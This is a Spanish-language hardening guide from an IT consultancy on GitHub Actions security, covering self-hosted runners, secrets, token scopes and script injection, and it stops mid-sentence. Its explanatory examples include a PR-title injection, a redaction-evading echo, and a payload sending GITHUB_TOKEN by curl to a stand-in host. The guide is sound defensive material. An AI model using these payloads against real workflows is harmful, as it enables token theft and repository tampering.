
![](media/image4.png)

 

 

 

Responsable: Sebastian Ramos 

> Ingeniero DevOps 
>
> ✉️[[sramos@cleveritgroup.com]{.underline}](mailto:sramos@cleveritgroup.com) 

  

Departamento: [[Clever
DevOps]{.underline}](https://www.cleveritgroup.com/service/clever-devops) 

 

 

**Cleverit Group 2024** 

 

✉️ Contacto: 

[[comercial@cleveritgroup.com]{.underline}](mailto:comercial@cleveritgroup.com) 

 

🌎 Sitio Web 

[[www.cleveritgroup.com]{.underline}](http://www.cleveritgroup.com/) 

Tabla de contenido

[**Recomendaciones de hardening para Runners auto hospedados
4**](#recomendaciones-de-hardening-para-runners-auto-hospedados)

[Impacto potencial de un ejecutor puesto en riesgo
4](#impacto-potencial-de-un-ejecutor-puesto-en-riesgo)

> [Acceder a los secretos 4](#acceder-a-los-secretos)
>
> [Exfiltrar datos de un ejecutor 5](#exfiltrar-datos-de-un-ejecutor)
>
> [Robo del elemento GITHUB_TOKEN del trabajo
> 5](#robo-del-elemento-github_token-del-trabajo)
>
> [Modificar el contenido de un repositorio
> 5](#modificar-el-contenido-de-un-repositorio)

[Considerar acceso entre repositorios
5](#considerar-acceso-entre-repositorios)

[Protección de ejecutores hospedados de GitHub
7](#protección-de-ejecutores-hospedados-de-github)

> [Revisión de la cadena de suministro para ejecutores hospedados en
> GitHub
> 7](#revisión-de-la-cadena-de-suministro-para-ejecutores-hospedados-en-github)
>
> [Denegación del acceso a los hosts
> 8](#denegación-del-acceso-a-los-hosts)

[Fortalecimiento para los ejecutores auto-hospedados
8](#fortalecimiento-para-los-ejecutores-auto-hospedados)

> [Uso de ejecutores Just-In-Time 9](#uso-de-ejecutores-just-in-time)
>
> [Planear tu estrategia de administración para los ejecutores
> auto-hospedados
> 10](#planear-tu-estrategia-de-administración-para-los-ejecutores-auto-hospedados)
>
> [Autenticarte a tu proveedor en la nube
> 10](#autenticarte-a-tu-proveedor-en-la-nube)

[**Recomendaciones de seguridad para organizaciones de empresas
11**](#recomendaciones-de-seguridad-para-organizaciones-de-empresas)

[**Seguridad para GitHub Actions 11**](#seguridad-para-github-actions)

> [Información general 11](#información-general)

[Uso de secretos 11](#uso-de-secretos)

[Uso de CODEOWNERS para supervisar los cambios
13](#uso-de-codeowners-para-supervisar-los-cambios)

[Entender el riesgo de las inyecciones de código
13](#entender-el-riesgo-de-las-inyecciones-de-código)

> [Ejemplo de un ataque de inyección de scripts
> 14](#ejemplo-de-un-ataque-de-inyección-de-scripts)

[Buenas prácticas para mitigar los ataques de inyección de scripts
15](#buenas-prácticas-para-mitigar-los-ataques-de-inyección-de-scripts)

> [Utilizar una acción en vez de un script dentro de las líneas
> (recomendado)
> 15](#utilizar-una-acción-en-vez-de-un-script-dentro-de-las-líneas-recomendado)
>
> [Utilizar una variable de ambiente intermedia
> 15](#utilizar-una-variable-de-ambiente-intermedia)
>
> [Utilizar flujos de trabajo inicial para el escaneo de código
> 16](#utilizar-flujos-de-trabajo-inicial-para-el-escaneo-de-código)
>
> [Restringir los permisos para los tokens
> 17](#restringir-los-permisos-para-los-tokens)

[Utilizar OpenID connect para acceder a los recursos en la nube
17](#utilizar-openid-connect-para-acceder-a-los-recursos-en-la-nube)

[Utilizar acciones de terceros 17](#utilizar-acciones-de-terceros)

[Reutilizar los flujos de trabajo de terceros
18](#reutilizar-los-flujos-de-trabajo-de-terceros)

[El uso de Dependabot version updates mantiene actualizadas las
dependencias
18](#el-uso-de-dependabot-version-updates-mantiene-actualizadas-las-dependencias)

[Impedir que GitHub Actions de cree o apruebe solicitudes de
incorporación de cambios
19](#impedir-que-github-actions-de-cree-o-apruebe-solicitudes-de-incorporación-de-cambios)

[Auditar eventos de GitHub Actions
19](#auditar-eventos-de-github-actions)

[Utilizar las tarjetas de puntuación para asegurar los flujos de trabajo
20](#utilizar-las-tarjetas-de-puntuación-para-asegurar-los-flujos-de-trabajo)

[**Seguridad para empresas 20**](#seguridad-para-empresas)

[Asignar varios propietarios 20](#asignar-varios-propietarios)

[Identifique el mejor método de autenticación para su empresa
20](#identifique-el-mejor-método-de-autenticación-para-su-empresa)

[Usar políticas 20](#usar-políticas)

[Minimizar el número de organizaciones.
21](#minimizar-el-número-de-organizaciones.)

[Evite una colaboración extensa en repositorios propiedad de los
usuarios
21](#evite-una-colaboración-extensa-en-repositorios-propiedad-de-los-usuarios)

[Utilice nombres de usuario legibles por humanos
21](#utilice-nombres-de-usuario-legibles-por-humanos)

[**Seguridad para repositorios 22**](#seguridad-para-repositorios)

> [Introducción 22](#introducción)
>
> [Administrar el acceso a su repositorio
> 22](#administrar-el-acceso-a-su-repositorio)
>
> [Gestionar el gráfico de dependencia
> 22](#gestionar-el-gráfico-de-dependencia)
>
> [Administrar alertas de Dependabot
> 23](#administrar-alertas-de-dependabot)
>
> [Gestión de la revisión de dependencia
> 23](#gestión-de-la-revisión-de-dependencia)
>
> [Administrar las actualizaciones de seguridad del Dependabot
> 23](#administrar-las-actualizaciones-de-seguridad-del-dependabot)
>
> [Administrar actualizaciones de versiones de Dependabot
> 24](#administrar-actualizaciones-de-versiones-de-dependabot)
>
> [Configurar el escaneo de código 24](#configurar-el-escaneo-de-código)
>
> [Configurar el escaneo secreto 25](#configurar-el-escaneo-secreto)
>
> [Establecer una política de seguridad
> 25](#establecer-una-política-de-seguridad)

[**Seguridad para organizaciones 26**](#seguridad-para-organizaciones)

[Asignar varios propietarios 26](#asignar-varios-propietarios-1)

[Usar equipos (teams) 26](#usar-equipos-teams)

[Usar descripción general de seguridad
26](#usar-descripción-general-de-seguridad)

[**Diagramas AS-IS y TO-BE para multiple tecnologías
27**](#diagramas-as-is-y-to-be-para-multiple-tecnologías)

> [Diagrama AS-IS 27](#diagrama-as-is)
>
> [Diagrama TO-BE 28](#diagrama-to-be)

# 

# 

# 

# 

# **Recomendaciones de hardening para Runners auto hospedados**

# **Impacto potencial de un ejecutor puesto en riesgo**

Estas secciones consideran algunos de los pasos que puede llevar a cabo
un atacante si pueden ejecutar comandos malintencionados en un ejecutor
de GitHub Actions.

-   Nota: GitHub-los ejecutores hospedados no buscan código
    > malintencionado descargado por un usuario durante su trabajo, como
    > una biblioteca de terceros en peligro.

## **Acceder a los secretos**

Los flujos de trabajo desencadenados desde un repositorio bifurcado
mediante el evento pull_request tienen permisos de solo lectura y no
tienen acceso a secretos. Pero estos permisos difieren para varios
desencadenadores de eventos, como issue_comment, issues y push, y
pull_request desde una rama dentro del repositorio, donde el atacante
podría intentar robar secretos del repositorio o usar el permiso de
escritura del elemento GITHUB_TOKEN del trabajo.

-   Si el token o el secreto se configura como una variable de entorno,
    > se puede acceder a él directamente mediante el entorno con
    > printenv.

-   Si el secreto se utiliza directamente en una expresiòn, el script
    > del shell que se generò se almacenarà en el disco y se podrà
    > acceder al èl.

-   En el caso de una acción personalizada, el riesgo puede variar
    > dependiendo de cómo un programa utiliza el secreto que obtuvo del
    > argumento:

> uses: fakeaction/publish@v3
>
> with:
>
> key: \${{ secrets.PUBLISH_KEY }}

Aunque GitHub Actions limpia los secretos de la memoria a los que no se
hace referencia en el flujo de trabajo (o que no se incluyen en una
acción), un atacante determinado podría recopilar GITHUB_TOKEN y
cualquier secreto al que se hace referencia.

## **Exfiltrar datos de un ejecutor**

Un atacante puede exfiltrar cualquier secreto u otros datos robados del
ejecutor. Para evitar la revelación accidental de secretos, GitHub
Actions redacta automáticamente los secretos impresos en el registro,
pero esto no es un límite de seguridad verdadero porque los secretos se
pueden enviar intencionadamente al registro. Por ejemplo, los secretos
ofuscados se pueden filtrar mediante echo \${SOME_SECRET:0:4}; echo
\${SOME_SECRET:4:200};. Adicionalmente, ya que el atacante podría
ejecutar comandos arbitrarios, podrían utilizar las solicitudes de tipo
HTTP para enviar secretos u otros datos del repositorio a un servidor
externo.

## **Robo del elemento GITHUB_TOKEN del trabajo**

Es posible que un atacante robe el elemento GITHUB_TOKEN del trabajo. El
ejecutor de GitHub Actions recibe automáticamente un elemento
GITHUB_TOKEN generado con permisos que se limitan únicamente al
repositorio que contiene el flujo de trabajo y el token expira una vez
que se haya completado el trabajo. Una vez que se venza, el token ya no
será útil para un atacante. Para evitar esta limitación, pueden
automatizar el ataque y realizarlo en fracciones de segundo llamando a
un servidor controlado por el atacante con el token, por ejemplo: a\";
set +e; curl http://example.com?token=\$GITHUB_TOKEN;#.

## **Modificar el contenido de un repositorio**

El servidor del atacante puede usar la API GitHub para modificar el
contenido del repositorio, incluidas las versiones, si los permisos
asignados de GITHUB_TOKEN no están restringidos.

# **Considerar acceso entre repositorios**

GitHub Actions tiene el alcance intencional de un solo repositorio a la
vez. GITHUB_TOKEN concede el mismo nivel de acceso que el de un usuario
con acceso de escritura, ya que cualquier usuario con este tipo de
acceso puede acceder a este token creando o modificando un archivo de
flujo de trabajo, lo que eleva los permisos de GITHUB_TOKEN en caso de
ser necesario. Los usuarios tienen permisos específicos para cada
repositorio, por lo que permitir que GITHUB_TOKEN para un repositorio
otorgue acceso a otro afectaría al modelo de permisos de GitHub si no se
implementa con cuidado. De forma similar, se debe tener cuidado al
agregar tokens de autenticación de GitHub a un flujo de trabajo, ya que
esto también puede afectar el modelo de permisos de GitHub al otorgar
inadvertidamente un acceso amplio a los colaboradores.

Si tu organización es propiedad de una cuenta empresarial, puedes
compartir y reutilizar GitHub Actions almacenándo las en repositorios
internos.

Otra forma de realizar interacciones privilegiadas entre repositorios es
hacer referencia a un token de autenticación de GitHub o llave SSH como
un secreto dentro del flujo de trabajo. Ya que muchos tipos de tokens de
autenticación no permiten el acceso granular a recursos específicos,
existe un riesgo significativo en el utilizar el tipo incorrecto de
token, ya que puede otorgar un acceso mucho más amplio que lo que se
espera.

Esta lista describe los acercamientos recomendados para acceder a los
datos de un repositorio dentro de un flujo de trabajo, en orden
descendente de preferencia:

**1 - GITHUB_TOKEN**

-   Este token tiene un ámbito intencional para el repositorio único que
    > invocó el flujo de trabajo y puede tener el mismo nivel de acceso
    > que el de un usuario con acceso de escritura en el repositorio. El
    > token se crea antes de que inicie cada job y caduca cuando dicho
    > job finaliza.

-   GITHUB_TOKEN se debe usar siempre que sea posible.

**2 - Clave de implementación del repositorio**

-   Las llaves de despliegue son uno de los únicos tipos de credenciales
    > que otorgan acceso de lectura o escritura en un solo repositorio,
    > y pueden utilizarse para interactuar con otro repositorio dentro
    > de un flujo de trabajo.

-   Nota que las llaves de despliegue solo pueden clonarse y subirse al
    > repositorio utilizando Git, y no pueden utilizarse para
    > interactuar con las API de REST o de GraphQL, así que puede no
    > sean adecuadas para tus necesidades.

**3 - Tokens de GitHub App**

-   Las GitHub Apps pueden instalarse en los repositorios seleccionados,
    > e incluso tienen permisos granulares en los recursos dentro de
    > ellos. Puedes crear una GitHub App interna a tu organización,
    > instalarla en los repositorios a los que necesites tener acceso
    > dentro de tu flujo de trabajo, y autenticarte como la instalación
    > dentro del flujo de trabajo para acceder a esos repositorios.

**4 - personal access tokens**

-   Nunca debes usar un personal access token (classic). Estos tokens
    > conceden acceso a todos los repositorios de las organizaciones a
    > las que tienes acceso, así como a los repositorios de tu cuenta
    > personal. Esto otorga indirectamente acceso amplio a todos los
    > usuarios con permisos de escritura para el repositorio en el cual
    > se encuentra el flujo de trabajo.

-   Si usas un personal access token, nunca debes usar un personal
    > access token desde tu propia cuenta. Si sales de una organización
    > más adelante, los flujos de trabajo que utilicen este token
    > fallará inmediatamente, y depurar este problema puede ser difícil.
    > En su lugar, debes usar un fine-grained personal access token para
    > una nueva cuenta que pertenece a tu organización y a la que sólo
    > se concede acceso a los repositorios específicos necesarios para
    > el flujo de trabajo. Nota que este acercamiento no es escalable y
    > debe evitarse para favorecer otras alternativas, tales como las
    > llaves de despliegue.

**5 - Claves SSH en una cuenta personal**

-   Los flujos de trabajo nunca deben usar las llaves SSH en una cuenta
    > personal. De forma similar a personal access tokens (classic),
    > otorgan permisos de lectura/escritura a todos tus repositorios
    > personales así como a todos los repositorios a los que tengas
    > acceso gracias a la pertenencia a una organización. Esto otorga
    > indirectamente acceso amplio a todos los usuarios con permisos de
    > escritura para el repositorio en el cual se encuentra el flujo de
    > trabajo. Si pretendes utilizar una llave SSH porque solo necesitas
    > llevar a cabo clonados de repositorio o subidas a éste, y no
    > necesitas interactuar con una API pública, entonces mejor deberías
    > utilizar llaves de despliegue individuales.

# **Protección de ejecutores hospedados de GitHub**

Los ejecutores hospedados de GitHub toman medidas para ayudar a mitigar
los riesgos de seguridad.

## **Revisión de la cadena de suministro para ejecutores hospedados en GitHub**

Puedes ver una lista de materiales de software (SBOM) a fin de comprobar
qué software se ha instalado previamente en la imagen del ejecutor
hospedado en GitHub usada durante las ejecuciones de flujo de trabajo.
Puedes proporcionar a los usuarios la SBOM, que pueden ejecutar con un
analizador de vulnerabilidades para validar si hay alguna vulnerabilidad
en el producto. Si vas a crear artefactos, puedes incluir esta SBOM en
la lista de materiales para obtener una lista completa de todo lo que se
ha utilizado en la creación del software.

Las SBOM están disponibles para imágenes de ejecutor de Ubuntu, Windows
y macOS. Puedes encontrar la SBOM de la compilación en los recursos de
versión en https://github.com/actions/runner-images/releases. Una SBOM
con un nombre de archivo en formato sbom.IMAGE-NAME.json.zip se puede
encontrar en los datos adjuntos de cada versión.

## **Denegación del acceso a los hosts**

Los ejecutores hospedados de GitHub se aprovisionan con un archivo
etc/hosts que bloquea el acceso de red a varios grupos de minería de
criptomonedas y sitios malintencionados. Los hosts como
MiningMadness.com y cpu-pool.com se vuelven a enrutar a localhost para
que no presenten un riesgo de seguridad significativo.

# **Fortalecimiento para los ejecutores auto-hospedados**

Los ejecutores hospedados en GitHub ejecutan código en máquinas
virtuales aisladas, limpias y efímeras, lo que significa que no hay
forma de poner este entorno en riesgo de forma persistente, o de obtener
acceso de otra forma a más información de la que se ha colocado en este
entorno durante el proceso de arranque.

Los ejecutores auto hospedados para GitHub no tienen garantías sobre
ejecutar en máquinas virtuales limpias y efímeras, y pueden ponerse en
riesgo de forma persistente mediante el código no fiable en un flujo de
trabajo.

Como resultado, los ejecutores auto hospedados casi nunca se deben usar
para repositorios públicos en GitHub, ya que cualquier usuario puede
abrir solicitudes de incorporación de cambios en el repositorio y poner
en peligro el entorno. De manera similar, ten cuidado al utilizar
ejecutores auto hospedados en repositorios privados o internos, ya que
cualquier usuario que pueda bifurcar el repositorio y abrir una
solicitud de incorporación de cambios (por lo general, aquellos con
acceso de lectura al repositorio) pueden poner en riesgo el entorno del
ejecutor auto hospedado, incluida la obtención de acceso a los secretos
y a GITHUB_TOKEN que, en función de su configuración, puede conceder
acceso de lectura al repositorio. Aunque los flujos de trabajo pueden
controlar el acceso a los secretos de ambiente utilizando ambientes y
revisiones requeridas, estos flujos de trabajo no se encuentran en un
ambiente aislado y aún son susceptibles a los mismos riesgos cuando se
ejecutan en un ejecutor auto-hospedado.

Las organizaciones pueden deshabilitar la capacidad de crear ejecutores
auto hospedados en el nivel de repositorio. Para más información,
consulta \"Inhabilitar o limitar GitHub Actions para tu organización\".

Cuando se define un ejecutor auto-hospedado a nivel de organización o de
empresa, GitHub puede programar flujos de trabajo de repositorios
múltiples en el mismo ejecutor. Como consecuencia, si se pone en riesgo
la seguridad de estos ambientes, se puede ocasionar un impacto amplio.
Para ayudar a reducir el alcance de esta vulneración, puedes crear
límites si organizas tus ejecutores auto-hospedados en grupos separados.
Puedes restringir qué organizaciones y repositorios pueden acceder a los
grupos de ejecutores.

También deberás considerar el ambiente de las máquinas del ejecutor
auto-hospedado:

-   ¿Qué información sensible reside en la máquina configurada como el
    > ejecutor auto-hospedado? Por ejemplo, llaves SSH privadas, tokens
    > de acceso a la API, entre otros.

-   ¿La máquina tiene acceso a la red para servicios sensibles? Por
    > ejemplo, servicios de metadatos de Azure o de AWS. La cantidad de
    > información sensible en este ambiente debe ser mínima, y siempre
    > debes estar consciente de que cualquier usuario capaz de invocar
    > flujos de trabajo tendrá acceso a este ambiente.

Algunos clientes podrían intentar mitigar estos riesgos parcialmente
implementando sistemas que destruyan al ejecutor auto-hospedado
automáticamente después de cada ejecución de un job. Sin embargo, este
acercamiento podría no ser tan efectivo como se pretende, ya que no hay
forma de garantizar que un ejecutor auto-hospedado ejecute solamente un
job. Algunos trabajos utilizan secretos como los argumentos de la línea
de comandos, los cuales puede ver otro trabajo que se esté ejecutando en
el mismo ejecutor, como ps x -w. Esto puede causar fugas de secretos.

## **Uso de ejecutores Just-In-Time**

Para mejorar la seguridad del registro del ejecutor, puedes usar la API
REST para crear ejecutores efímeros Just-In-Time (JIT). Estos ejecutores
auto hospedados realizan como máximo un trabajo antes de quitarse
automáticamente del repositorio, la organización o la empresa.

-   Nota: Volver a usar hardware para hospedar ejecutores JIT puede
    > poner en riesgo la exposición de información del entorno. Utiliza
    > la automatización para asegurarte de que el ejecutor JIT use un
    > entorno limpio.

Cuando tengas el archivo de configuración de la respuesta de la API
REST, puedes pasarlo al ejecutor en el inicio.

./run.sh \--jitconfig \${encoded_jit_config}

## **Planear tu estrategia de administración para los ejecutores auto-hospedados**

Un ejecutor auto-hospedado puede agregarse a varios niveles en tu
jerarquía de GitHub: el nivel de empresa, organización o repositorio.
Esta colocación determina quién podrá administrar el ejecutor:

Administración centralizada:

-   Si planeas que un equipo centralizado sea el propietario de los
    > ejecutores auto-hospedados, entonces la recomendación es agregar
    > tus ejecutores en el nivel de empresa u organización mutua más
    > alto. Esto otorga a tu equipo una ubicación única para ver y
    > administrar tus ejecutores.

-   Si solo tienes una organización sencilla, entonces el agregar tus
    > ejecutores a nivel organizacional es efectivamente el mismo
    > acercamiento, pero puede que encuentres dificultades si agregas
    > otra organización en el futuro.

Administración descentralizada:

-   Si cada equipo administra sus propios ejecutores auto-hospedados,
    > entonces se recomienda agregarlos en el nivel más alto de
    > propiedad del equipo. Por ejemplo, si cada equipo es dueño de su
    > propia organización, entonces será más simple si los ejecutores se
    > agregan a nivel de organización también.

-   También podrías agregar ejecutores a nivel de repositorio, pero esto
    > agrega una sobrecarga de administración y también incrementará la
    > cantidad de ejecutores que necesitas, ya que no puedes compartir
    > ejecutores entre repositorios.

## **Autenticarte a tu proveedor en la nube**

Si estás utilizando las GitHub Actions para desplegar a un proveedor en
la nube o si intentas utilizar HashiCorp Vault para la administración de
secretos, entonces se recomienda que consideres utilizar OpenID Connect
para crear tokens de acceso con un buen alcance y de vida corta para tus
ejecuciones de flujo de trabajo.

# **Recomendaciones de seguridad para organizaciones de empresas**

# **Seguridad para GitHub Actions**

## **Información general**

Esta guía explica cómo configurar el fortalecimiento de seguridad para
ciertas características de las GitHub Actions.

# **Uso de secretos**

Los valores sensibles jamás deben almacenarse como texto simple en
archivos de flujo de trabajo, sino más bien como secretos. Los secretos
se pueden configurar en el nivel de organización, repositorio o entorno,
y permiten almacenar información confidencial en GitHub.

Los secretos usan cajas selladas de Libsodium para que se cifren antes
de alcanzar GitHub. Esto ocurre cuando el secreto se envía con la
interfaz de usuario o mediante la API REST. Este cifrado del lado del
cliente ayuda a minimizar los riesgos relacionados con el registro
accidental (por ejemplo, bitácoras de excepción y de solicitud, entre
otras) dentro de la infraestructura de GitHub. Una vez que se carga el
secreto, GitHub puede entonces descifrarlo para que se pueda inyectar en
el tiempo de ejecución del flujo de trabajo.

Para ayudar a prevenir la divulgación accidental, GitHub utiliza un
mecanismo que intenta redactar cualquier secreto que aparezca en las
bitácoras de ejecución. La redacción busca coincidencias exactas de
cualquier secreto configurado usado en el trabajo, así como los cifrados
comunes de los valores, tales como Base64. Sin embargo, ya que hay
varias formas en las que se puede transformar el valor de un secreto,
esta redacción no está garantizada. Además, el ejecutor solo puede
censurar secretos usados en el trabajo actual. Como resultado, hay
ciertos pasos proactivos y buenas prácticas que debes seguir para
ayudarte a garantizar que se redacten los secretos, y para limitar otros
riesgos asociados con ellos:

**No usar nunca datos estructurados como un secreto**

-   Los datos estructurados pueden causar que la redacción de secretos
    > dentro de las bitácoras falle, ya que la redacción depende
    > ampliamente de encontrar una coincidencia exacta para el valor
    > específico del secreto. Por ejemplo, no utilices un blob de JSON,
    > XML, o YAML (o similares) para encapsular el valor de un secreto,
    > ya que esto reduce significativamente la probabilidad de que los
    > secretos se redacten adecuadamente. En vez de esto, crea secretos
    > individuales para cada valor sensible.

**Registrar todos los secretos utilizados en los flujos de trabajo**

-   Si se usa un secreto para generar otro valor confidencial en un
    > flujo de trabajo, ese valor generado debe registrarse formalmente
    > como secreto, de modo que se redactará si alguna vez aparece en
    > los registros. Por ejemplo, si utilizas una llave privada para
    > generar un JWT firmado para acceder a una API web, asegúrate
    > registrar este JWT como un secreto, de lo contrario, este no se
    > redactará si es que llega a ingresar en la salida de la bitácora.

-   El registro de secretos aplica también a cualquier tipo de
    > transformación/cifrado. Si tu secreto se transforma de alguna
    > manera (como en el cifrado URL o de Base64), asegúrate de
    > registrar el valor nuevo como un secreto también.

**Auditar cómo se controlan los secretos**

-   Audita cómo se utilizan los secretos para ayudarte a garantizar que
    > se manejan como lo esperas. Puedes hacer esto si revisas el código
    > fuente del repositorio que ejecuta el flujo de trabajo y verificar
    > cualquier acción que se utilice en dicho flujo de trabajo. Por
    > ejemplo, verifica que no se estén enviando a hosts no deseados, o
    > que no se estén imprimiendo explícitamente en la salida de una
    > bitácora.

-   Visualiza las bitácoras de ejecución de tu flujo de trabajo después
    > de probar las entradas válidas/no válidas y verifica que los
    > secretos se redacten adecuadamente o que no se muestren. No
    > siempre resulta obvio la forma en que un comando o herramienta que
    > está invocando enviará errores a STDOUT y STDERR, y los secretos
    > podrían acabar posteriormente en los registros de errores. Por
    > consiguiente, es una buena práctica el revisar manualmente las
    > bitácoras de flujo de trabajo después de probar las entradas
    > válidas y no válidas

**Utilizar credenciales cuyo ámbito sea el mínimo**

-   Asegúrate de que las credenciales que estás utilizando dentro de los
    > flujos de trabajo tengan los menores privilegios requeridos y ten
    > en mente que cualquier usuario con acceso de escritura en tu
    > repositorio tiene acceso de lectura para todos los secretos que
    > has configurado en éste.

-   Las acciones pueden usar GITHUB_TOKEN accediendo a él desde el
    > contexto github.token. Por lo tanto, debe asegurarse de que se
    > conceden los permisos mínimos necesarios a GITHUB_TOKEN. Una buena
    > práctica de seguridad consiste en establecer el permiso
    > predeterminado para que GITHUB_TOKEN tenga acceso de lectura solo
    > para contenido del repositorio. Se puede incrementar los permisos,
    > conforme se requiera, para los jobs individuales dentro del
    > archivo de flujo de trabajo.

**Auditar y rotar los secretos registrados**

-   Revisa con frecuencia los secretos que se han registrado para
    > confirmar que aún se requieran. Elimina aquellos que ya no se
    > necesiten.

-   Rota los secretos con frecuencia para reducir la ventana de tiempo
    > en la que un secreto puesto en riesgo es aún válido.

**Tener en cuenta la exigencia de revisiones para acceder a los
secretos**

-   Puedes utilizar las revisiones requeridas para proteger los secretos
    > del ambiente. Un job del flujo de trabajo no podrá acceder a los
    > secretos del ambiente hasta que el revisor otorgue la aprobación.

**Advertencia:** Cualquier usuario con acceso de escritura al
repositorio tiene acceso de lectura a todos los secretos configurados en
él. Por lo tanto, debe asegurarse de que las credenciales que se usan en
los flujos de trabajo tienen los privilegios mínimos necesarios.

# **Uso de CODEOWNERS para supervisar los cambios**

Puede usar la característica CODEOWNERS para controlar cómo se realizan
los cambios en los archivos de flujo de trabajo. Por ejemplo, si todos
sus archivos de flujo de trabajo se almacenan en .github/workflows,
puede agregar este directorio a la lista de propietarios de código para
que cualquier cambio propuesto a estos archivos requiera primero de una
aprobación de un revisor designado.

# **Entender el riesgo de las inyecciones de código**

Cuando cree flujos de trabajo, acciones personalizadas y acciones
compuestas, siempre debe plantearse si el código podría ejecutar
entradas no fiables de atacantes. Esto puede ocurrir cuando un atacante
agrega comandos y scripts malintencionados a un contexto. Cuando tu
flujo de trabajo se ejecuta, estas secuencias podrían interpretarse como
código que luego se ejecutará en el ejecutor.

Los atacantes pueden agregar su propio contenido malintencionado al
contexto de github, que se debe tratar como una entrada potencialmente
no fiable. Normalmente, estos contextos terminan con body,
default_branch, email, head_ref, label, message, name, page_name, ref y
title. Por ejemplo: github.event.issue.title o
github.event.pull_request.body.

Debes asegurarte de que estos valores no fluyan directamente hacia los
flujos de trabajo, acciones, llamados a las API ni a cualquier otro
lugar en donde se puedan interpretar como código ejecutable. Cuando
adoptas la misma postura de programación defensiva que utilizarás para
cualquier otro código de aplicaciones privilegiado, puedes ayudar a que
la seguridad fortalezca tu uso de las GitHub Actions.

Adicionalmente, hay otras fuentes menos obvias de entradas no
confiables, tales como los nombres de rama y las direcciones de correo
electrónico, las cuales pueden ser bastante flexibles en cuestión de su
contenido permitido. Por ejemplo, zzz\";echo\${IFS}\"hello\";# Sería un
nombre de rama válido y un posible vector de ataque para un repositorio
de destino.

Las siguientes secciones explican cómo puedes ayudar a mitigar el riesgo
de inyección de scripts.

## **Ejemplo de un ataque de inyección de scripts**

Un ataque de inyección de scripts puede ocurrir directamente dentro de
un script dentro de las líneas de un flujo de trabajo. En el siguiente
ejemplo, una acciòn utiliza una expresiòn para probar la validez del
tìtulo de una solicitud de cambios, pero también agrega el riesgo de
ocasionar una inyecciòn de scripts:

> \- name: Check PR title
>
> run: \|
>
> title=\"\${{ github.event.pull_request.title }}\"
>
> if \[\[ \$title =\~ \^octocat \]\]; then
>
> echo \"PR title starts with \'octocat\'\"
>
> exit 0
>
> else
>
> echo \"PR title did not start with \'octocat\'\"
>
> exit 1
>
> fi

Este ejemplo es vulnerable a la inyección de scripts, ya que el comando
run se ejecuta en un script de shell temporal en el ejecutor. Antes de
que se ejecute el script, se evalúan las expresiones dentro de \${{ }} y
luego se sustituyen con los valores resultantes, que puede hacerlo
vulnerable a la inyección de comandos de shell.

Para insertar comandos en este flujo de trabajo, el atacante podría
crear una solicitud de incorporación de cambios denominada a\"; ls
\$GITHUB_WORKSPACE\":

![](media/image3.png)

En este ejemplo, el carácter \" se usa para interrumpir la instrucción
title=\"\${{ github.event.pull_request.title }}\", lo que permite
ejecutar el comando ls en el ejecutor. Puede ver la salida del comando
ls en el registro:

> Run title=\"a\"; ls \$GITHUB_WORKSPACE\"\"
>
> README.md
>
> code.yml
>
> example.js

# **Buenas prácticas para mitigar los ataques de inyección de scripts**

Hay varios acercamientos diferentes disponibles para ayudarte a mitigar
el riesgo de inyecciones de scripts:

## **Utilizar una acción en vez de un script dentro de las líneas (recomendado)**

El acercamiento recomendado es crear una acción que procese el valor del
contexto como un argumento. Este acercamiento no es vulnerable a los
ataques de inyecciòn, ya que el valor del contexto no se utiliza para
generar un script de un shell, sino que se pasa a la acciòn como un
argumento en vez de eso:

> uses: fakeaction/checktitle@v3
>
> with:
>
> title: \${{ github.event.pull_request.title }}

## **Utilizar una variable de ambiente intermedia**

Para los scripts dentro de las líneas, el acercamiento preferente para
manejar las entradas no confiables es configurar el valor de la
expresión en una variable de ambiente intermedia.

En el ejemplo siguiente se usa Bash para procesar el valor
github.event.pull_request.title como una variable de entorno:

> \- name: Check PR title
>
> env:
>
> TITLE: \${{ github.event.pull_request.title }}
>
> run: \|
>
> if \[\[ \"\$TITLE\" =\~ \^octocat \]\]; then
>
> echo \"PR title starts with \'octocat\'\"
>
> exit 0
>
> else
>
> echo \"PR title did not start with \'octocat\'\"
>
> exit 1
>
> fi

En este ejemplo, el intento de inyección de script no se realiza
correctamente, lo que se refleja en las líneas siguientes del registro:

> env:
>
> TITLE: a\"; ls \$GITHUB_WORKSPACE\"
>
> PR title did not start with \'octocat\'

Con este enfoque, el valor de la expresión \${{ github.event.issue.title
}} se almacena en memoria y se usa como variable, y no interactúa con el
proceso de generación de scripts. Además, considere la posibilidad de
usar variables de shell de comillas dobles para evitar la división de
palabras, si bien esta es una de las muchas recomendaciones generales
para escribir scripts de shell y no es específica de GitHub Actions.

## **Utilizar flujos de trabajo inicial para el escaneo de código**

-   Nota: Los flujos de trabajo de inicio de Advanced Security se han
    > consolidado en la categoría \"Security\" (Seguridad) de la pestaña
    > Actions (Acciones) de un repositorio. Esta nueva configuración
    > está actualmente en versión beta y está sujeta a cambios.

Code scanning permite encontrar vulnerabilidades de seguridad antes de
que lleguen a producción. GitHub proporciona flujos de trabajo iniciales
para el code scanning. Puedes utilizar estos flujos de trabajo sugeridos
para construir tus flujos de trabajo del code scanning en vez de
comenzar desde cero. El flujo de trabajo de GitHub, el Flujo de trabajo
de análisis de CodeQL, funciona con CodeQL. También existen flujos de
trabajo iniciales de terceros disponibles.

## **Restringir los permisos para los tokens**

Para ayudarte a mitigar el riesgo de un token expuesto, considera
restringir los permisos asignados.

# **Utilizar OpenID connect para acceder a los recursos en la nube**

Si tus flujos de trabajo de GitHub Actions necesitan acceder a los
recursos de un proveedor de servicios en la red que sea compatible con
OpenID Connect (OIDC), puedes configurarlos para que se autentiquen
directamente con dicho proveedor. Esto te permitirá dejar de almacenar
estas credenciales como secretos de larga duración y te proporcionará
otros beneficios de seguridad.

-   Nota: La compatibilidad con notificaciones personalizadas para OIDC
    > no está disponible en AWS.

# **Utilizar acciones de terceros**

Los jobs individuales en un flujo de trabajo pueden interactuar con (y
ponerse en riesgo con) otros jobs. Por ejemplo, un job que consulta las
variables de ambiente que se utilizan por otro job subsecuente, escribir
archivos en un directorio compartido que el job subsecuente procesa, o
aún de forma más directa si interactúa con el conector de Docker e
inspecciona a otros contenedores en ejecución y ejecuta comandos en
ellos.

Esto significa que poner en peligro una sola acción dentro de un flujo
de trabajo puede ser muy significativo, ya que esta acción en peligro
tiene acceso a todos los secretos que configura en su repositorio, y
podría utilizar GITHUB_TOKEN para escribir en él. Por consiguiente, hay
un riesgo significativo en suministrar acciones de repositorios de
terceros en GitHub.

**Puedes ayudar a mitigar este riesgo si sigues estas buenas
prácticas:**

-   **Anclar las acciones a un SHA de confirmación de longitud
    > completa**

> Fijar una acción a un SHA de confirmación de longitud completa es
